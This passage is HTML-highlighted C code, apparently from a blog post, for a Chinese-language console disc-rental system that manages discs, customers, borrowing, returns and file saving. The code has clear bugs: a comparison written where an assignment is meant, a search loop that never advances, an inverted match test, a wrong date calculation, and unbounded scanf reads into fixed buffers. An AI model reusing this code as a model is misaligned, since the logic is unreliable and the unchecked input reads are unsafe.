class="string">"不存在该影片\n"</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            p2-&gt;next = p1-&gt;next;</span><br><span class="line">            <span class="built_in">free</span>(p1);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"删除成功"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">discModify</span><span class="params">(DiscInfo **L)</span> </span>&#123;</span><br><span class="line">    DiscInfo *p = *L;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入您想要修改的碟片的名字:\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> query[<span class="number">50</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, query);</span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(query, p-&gt;name)) <span class="keyword">break</span>;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入新影碟国家:\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>, p-&gt;country);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入新影碟类型:\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>, p-&gt;type);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入新影碟导演:\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>, p-&gt;director);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入新影碟制片人:\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>, p-&gt;producer);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入新影碟主演明星(如有多个，每个明星之间以空格隔开):\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        fgets(p-&gt;stars, <span class="keyword">sizeof</span>(p-&gt;stars), <span class="built_in">stdin</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入新影碟库存量:\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;p-&gt;inventory);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"修改成功！\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"不存在该影碟"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">customerAdd</span><span class="params">(CustomerInfo **L)</span> </span>&#123;</span><br><span class="line">    CustomerInfo *newCustomer = (CustomerInfo *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CustomerInfo));</span><br><span class="line">    newCustomer-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入顾客名字：\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, newCustomer-&gt;name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入顾客账户id：\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%ld"</span>, &amp;newCustomer-&gt;id);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入顾客账户金额：\n"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%ld"</span>, &amp;newCustomer-&gt;acount);</span><br><span class="line">    newCustomer-&gt;RentList = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (*L == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        *L = newCustomer;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        newCustomer-&gt;next = *L;</span><br><span class="line">        *L = newCustomer;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"添加完毕\n"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">customerDelete</span><span class="params">(CustomerInfo **L)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((*L) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"还没有用户，无法删除!\n"</span>);</span><br><span class="line">        system(<span class="string">"pause"</span>);</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    CustomerInfo *p1 = (*L)-&gt;next, *p2 = *L;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入想要删除的顾客名字：\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> query[<span class="number">50</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, query);</span><br><span class="line">    <span class="comment">// 删除头节点</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>((*L)-&gt;name, query)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((*L)-&gt;RentList != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"该用户还未归还借阅的碟片，不能删除用户\n"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            (*L) = (*L)-&gt;next;</span><br><span class="line">            <span class="built_in">free</span>(p2);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"删除成功"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (p1 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(query, p1-&gt;name)) <span class="keyword">break</span>;</span><br><span class="line">            p2 = p1;</span><br><span class="line">            p1 = p1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (p1 == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"不存在该用户\n"</span>);</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (p1-&gt;RentList != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"该用户还未归还借阅的碟片，不能删除用户\n"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                p2-&gt;next = p1-&gt;next;</span><br><span class="line">                <span class="built_in">free</span>(p1);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"删除成功"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">customerModify</span><span class="params">(CustomerInfo **L)</span> </span>&#123;</span><br><span class="line">    CustomerInfo *p = *L;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入想要修改的顾客的账户id：\n"</span>);</span><br><span class="line">    <span class="keyword">long</span> query;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%ld"</span>, &amp;query);</span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (query != p-&gt;id) <span class="keyword">break</span>;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入新顾客名字:\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>, p-&gt;name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入新顾客账户金额:\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%ld"</span>, &amp;p-&gt;acount);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"修改成功！\n"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"不存在该用户"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">borrowDisc</span><span class="params">(RentInfo **RL, DiscInfo **DL, CustomerInfo **CL)</span> </span>&#123;</span><br><span class="line">    DiscInfo *dp = *DL;</span><br><span class="line">    CustomerInfo *cp = *CL;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入借阅人的id,输入“0”结束本次借阅\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%ld"</span>, &amp;id);</span><br><span class="line">        <span class="keyword">if</span> (!id) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">while</span> (cp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cp-&gt;id == id) <span class="keyword">break</span>;</span><br><span class="line">            cp = cp-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"用户不存在，请重新输入\n"</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (cp-&gt;acount &lt; <span class="number">20</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"租金不足20元，无法借阅\n"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"请输入借阅日期(格式：年月日时分秒，如20200526192222)\n"</span>);</span><br><span class="line">            <span class="keyword">long</span> <span class="keyword">long</span> date;</span><br><span class="line">            <span class="comment">// scanf("%lld", &amp;date);</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%lld"</span>, &amp;date) &amp;&amp;</span><br><span class="line">                   !(date &lt; <span class="number">99999999999999</span> &amp;&amp; date &gt; <span class="number">10000000000000</span>)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"日期格式错误\n"</span>);</span><br><span class="line">                <span class="comment">//  continue;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                <span class="string">"请输入借阅的碟片数量（一次只能借阅同种碟片的一片，但是可以借阅"</span></span><br><span class="line">                <span class="string">"不同的碟片）\n"</span>);</span><br><span class="line">            <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;count);</span><br><span class="line">            <span class="keyword">int</span> status[<span class="number">100</span>];</span><br><span class="line">            <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">50</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= count; i++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"请输入第%d个碟片的名字\n"</span>, i);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%s"</span>, <span class="built_in">buffer</span>);</span><br><span class="line">                dp = *DL;</span><br><span class="line">                <span class="keyword">while</span> (dp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(<span class="built_in">buffer</span>, dp-&gt;name)) <span class="keyword">break</span>;</span><br><span class="line">                    dp = dp-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (dp == <span class="literal">NULL</span> || dp-&gt;inventory == <span class="number">0</span>)</span><br><span class="line">                    status[i] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    dp-&gt;inventory--;</span><br><span class="line">                    RentInfo *newRent = (RentInfo *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(RentInfo));</span><br><span class="line">                    newRent-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">                    newRent-&gt;BDate = date;</span><br><span class="line">                    newRent-&gt;CId = cp-&gt;id;</span><br><span class="line">                    newRent-&gt;isReturn = <span class="number">0</span>;</span><br><span class="line">                    <span class="built_in">strcpy</span>(newRent-&gt;DName, <span class="built_in">buffer</span>);</span><br><span class="line">                    <span class="keyword">if</span> (*RL == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        *RL = newRent;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        newRent-&gt;next = *RL;</span><br><span class="line">                        *RL = newRent;</span><br><span class="line">                    &#125;</span><br><span class="line">                    newRent-&gt;isReturn = <span class="number">0</span>;</span><br><span class="line">                    Blist *newBlist = (Blist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Blist));</span><br><span class="line">                    newBlist-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">                    <span class="built_in">strcpy</span>(newBlist-&gt;DName, <span class="built_in">buffer</span>);</span><br><span class="line">                    <span class="keyword">if</span> (cp-&gt;RentList == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        cp-&gt;RentList = newBlist;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        newBlist-&gt;next = cp-&gt;RentList;</span><br><span class="line">                        cp-&gt;RentList = newBlist;</span><br><span class="line">                    &#125;</span><br><span class="line">                    status[i] == <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> successCount = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= count; i++)</span><br><span class="line">                <span class="keyword">if</span> (!status[i])</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"借阅的第%d个碟片失败\n"</span>);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    successCount++;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"本次借阅碟片成功数量：%d，失败数量：%d\n"</span>, successCount,</span><br><span class="line">                   count - successCount);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"操作成功\n"</span>);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;  <span class="comment">// 2020 0222 181212</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getDays</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> num1, <span class="keyword">long</span> <span class="keyword">long</span> num2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> months[<span class="number">12</span>] = &#123;<span class="number">31</span>, <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>, year, month, day;</span><br><span class="line">    year = (num1 - num2) / <span class="number">10000000000</span>;</span><br><span class="line">    month = (num1 - num2) / <span class="number">100000000</span>;</span><br><span class="line">    day = (num1 - num2) / <span class="number">1000000</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= month - <span class="number">2</span>; i++) sum += months[i];</span><br><span class="line">    sum += day;</span><br><span class="line">    sum += year * <span class="number">365</span>;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">returnDisc</span><span class="params">(RentInfo **RL, DiscInfo **DL, CustomerInfo **CL)</span> </span>&#123;</span><br><span class="line">    DiscInfo *dp = *DL;</span><br><span class="line">    CustomerInfo *cp = *CL;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入归还人的id,输入“0”结束本次归还\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%ld"</span>, &amp;id);</span><br><span class="line">        <span class="keyword">if</span> (!id) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">while</span> (cp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cp-&gt;id == id) <span class="keyword">break</span>;</span><br><span class="line">            cp = cp-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"用户不存在，请重新输入\n"</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"请输入归还日期(格式：年月日时分秒，如20200526192222)\n"</span>);</span><br><span class="line">            <span class="keyword">long</span> <span class="keyword">long</span> date;</span><br><span class="line">            <span class="comment">// scanf("%lld", &amp;date);</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">"%lld"</span>, &amp;date) &amp;&amp;</span><br><span class="line">                   !(date &lt; <span class="number">99999999999999</span> &amp;&amp; date &gt; <span class="number">10000000000000</span>)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"日期格式错误\n"</span>);</span><br><span class="line">                <span class="comment">//  continue;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"请输入归还的碟片数量\n"</span>);</span><br><span class="line">            <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;count);</span><br><span class="line">            <span class="keyword">int</span> status[<span class="number">100</span>];</span><br><span class="line">            <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">100</span>][<span class="number">50</span>];</span><br><span class="line">            RentInfo *rp;</span><br><span class="line">            <span class="keyword">int</span> totalCost = <span class="number">0</span>, reality = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= count; i++) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"请输入第%d个碟片的名字\n"</span>, i);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">"%s"</span>, <span class="built_in">buffer</span>[i]);</span><br><span class="line">                rp = *RL;</span><br><span class="line">                <span class="keyword">while</span> (rp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(rp-&gt;DName, <span class="built_in">buffer</span>[i]) &amp;&amp; !(rp-&gt;isReturn)) &#123;</span><br><span class="line">                        rp-&gt;RDate = date;</span><br><span class="line">                        <span class="keyword">int</span> days = getDays(rp-&gt;RDate, rp-&gt;BDate);</span><br><span class="line">                        <span class="comment">// 日期错误</span></span><br><span class="line">                        <span class="keyword">if</span> (days &lt;= <span class="number">0</span>)</span><br><span class="line">                            status[i] = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            rp-&gt;rentNum = days / <span class="number">3</span>;</span><br><span class="line">                            <span class="keyword">if</span> (days % <span class="number">3</span> &gt; <span class="number">0</span>) rp-&gt;rentNum++;</span><br><span class="line">                            totalCost += rp-&gt;rentNum;</span><br><span class="line">                            <span class="comment">// 不够钱</span></span><br><span class="line">                            <span class="keyword">if</span> (cp-&gt;acount + <span class="number">20</span> - rp-&gt;rentNum &lt; <span class="number">0</span>)</span><br><span class="line">                                status[i] = <span class="number">0</span>;</span><br><span class="line">                            <span class="keyword">else</span> &#123;</span><br><span class="line">                                reality += rp-&gt;rentNum;</span><br><span class="line">                                cp-&gt;acount = cp-&gt;acount + <span class="number">20</span> - rp-&gt;rentNum;</span><br><span class="line">                                status[i] = <span class="number">1</span>;</span><br><span class="line">                                <span class="comment">// 记上已经归还</span></span><br><span class="line">                                rp-&gt;isReturn = <span class="number">1</span>;</span><br><span class="line">                                DiscInfo *d = *DL;</span><br><span class="line">                                <span class="keyword">while</span> (d != <span class="literal">NULL</span>)</span><br><span class="line">                                    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(d-&gt;name, <span class="built_in">buffer</span>[i])) <span class="keyword">break</span>;</span><br><span class="line">                                <span class="comment">//库存加一</span></span><br><span class="line">                                d-&gt;inventory++;</span><br><span class="line">                                Blist *b1 = cp-&gt;RentList-&gt;next,</span><br><span class="line">                                      *b2 = cp-&gt;RentList;</span><br><span class="line">                                <span class="comment">// 头节点</span></span><br><span class="line">                                <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cp-&gt;RentList-&gt;DName, <span class="built_in">buffer</span>[i])) &#123;</span><br><span class="line">                                    cp-&gt;RentList = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    <span class="keyword">while</span> (b1 != <span class="literal">NULL</span>)</span><br><span class="line">                                        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(b1-&gt;DName, <span class="built_in">buffer</span>[i]))</span><br><span class="line">                                            <span class="keyword">break</span>;</span><br><span class="line">                                        <span class="keyword">else</span> &#123;</span><br><span class="line">                                            b2 = b1;</span><br><span class="line">                                            b1 = b1-&gt;next;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    <span class="comment">// 头节点</span></span><br><span class="line">                                    <span class="keyword">if</span> (b1 == <span class="literal">NULL</span>)</span><br><span class="line">                                        b2 = b2-&gt;next;</span><br><span class="line">                                    <span class="keyword">else</span></span><br><span class="line">                                        b2-&gt;next = b1-&gt;next;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    rp = rp-&gt;next;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (rp == <span class="literal">NULL</span> || !(rp-&gt;isReturn)) &#123;</span><br><span class="line">                    status[i] = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> successCount = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= count; i++)</span><br><span class="line">                <span class="keyword">if</span> (!status[i])</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">"归还第%d个碟片失败\n"</span>, i);</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    successCount++;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"本次归还碟片成功数量：%d，失败数量：%d\n"</span>, successCount,</span><br><span class="line">                   count - successCount);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"本次归还碟片需要支付总费用%d，实际支付：%d\n"</span>, totalCost,</span><br><span class="line">                   reality);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"操作成功\n"</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">save</span><span class="params">(RentInfo *RL, DiscInfo *DL, CustomerInfo *CL)</span> </span>&#123;</span><br><span class="line">    FILE *fp = fopen(<span class="string">".\\rent.txt"</span>, <span class="string">"w+"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (RL != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%ld "</span>, RL-&gt;CId);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, RL-&gt;DName);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%lld "</span>, RL-&gt;BDate);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%lld "</span>, RL-&gt;RDate);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%ld "</span>, RL-&gt;rentNum);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%d "</span>, RL-&gt;isReturn);</span><br><span class="line">            fputc(<span class="string">'\n'</span>, fp);</span><br><span class="line">            RL = RL-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"rent.txt保存成功\n"</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"rent.txt保存失败\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fp = fopen(<span class="string">".\\customer.txt"</span>, <span class="string">"w+"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (CL != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%ld "</span>, CL-&gt;id);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, CL-&gt;name);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%ld "</span>, CL-&gt;acount);</span><br><span class="line">            Blist *b = CL-&gt;RentList;</span><br><span class="line">            <span class="keyword">while</span> (b != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, b-&gt;DName);</span><br><span class="line">                b = b-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">char</span> <span class="built_in">end</span>[] = &#123;<span class="string">'E'</span>, <span class="string">'N'</span>, <span class="string">'D'</span>, <span class="string">'\n'</span>&#125;;</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s"</span>, <span class="string">"END\n"</span>);</span><br><span class="line">            CL = CL-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"customer.txt保存成功\n"</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"customer.txt保存失败\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fp = fopen(<span class="string">".\\disc.txt"</span>, <span class="string">"w+"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (DL != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, DL-&gt;name);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, DL-&gt;country);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, DL-&gt;type);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, DL-&gt;director);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, DL-&gt;producer);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%s "</span>, DL-&gt;stars);</span><br><span class="line">            <span class="built_in">fprintf</span>(fp, <span class="string">"%d "</span>, DL-&gt;inventory);</span><br><span class="line">            fputc(<span class="string">'\n'</span>, fp);</span><br><span class="line">            DL = DL-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"customer.txt保存成功\n"</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"customer.txt保存失败\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    CustomerInfo *CL = <span class="literal">NULL</span>;</span><br><span class="line">    DiscInfo *DL = <span class="literal">NULL</span>;</span><br><span class="line">    RentInfo *RL = <span class="literal">NULL</span>;</span><br><span class="line">    customerInitial(&amp;CL);</span><br><span class="line">    discInitial(&amp;DL);</span><br><span class="line">    rentInitial(&amp;RL);</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">exit</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!<span class="built_in">exit</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> choose;</span><br><span class="line">        system(<span class="string">"cls"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span 